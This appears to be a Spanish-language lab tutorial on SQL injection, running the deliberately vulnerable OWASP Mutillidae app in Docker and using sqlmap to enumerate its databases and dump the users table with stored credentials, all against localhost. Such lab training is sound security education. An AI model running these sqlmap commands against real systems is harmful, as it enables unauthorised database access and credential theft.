![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Práctica con Aplicaciones Vulnerables en Kali Linux**

### **🛠 Escenario Práctico: SQL Injection con OWASP Mutillidae y SQLMap**

#### **📌 Paso 1: Configurar el Entorno**

OWASP Mutillidae es una aplicación web intencionalmente vulnerable para pruebas de seguridad. Para configurarla:

1. **Instalar OWASP Mutillidae en Kali Linux**
   Si usas Docker:

   ```bash
   docker pull citizenstig/nowasp
   docker run -d -p 80:80 citizenstig/nowasp
   ```

   Accede en el navegador: `http://localhost/`

2. **Verificar que la aplicación está corriendo**

   ```bash
   curl -I http://localhost/
   ```

------

#### **📌 Paso 2: Escaneo de Vulnerabilidades con SQLMap**

SQLMap es una herramienta automatizada para explotar SQL Injection.

1. Identificar parámetros vulnerables:

   ```bash
   sqlmap -u "http://localhost/mutillidae/index.php?page=login.php&username=admin&password=123" --dbs
   ```

   Esto detectará si el campo `username` es vulnerable a SQL Injection.

2. Extraer información de la base de datos:

   ```bash
   sqlmap -u "http://localhost/mutillidae/index.php?page=login.php&username=admin&password=123" -D mutillidae --tables
   ```

------

#### **📌 Paso 3: Explotación Avanzada**

Podemos obtener usuarios y contraseñas almacenadas en la base de datos:

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=login.php&username=admin&password=123" -D mutillidae -T users --dump
```

Si la aplicación no tiene protecciones adecuadas, devolverá credenciales en texto plano o hash.



![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)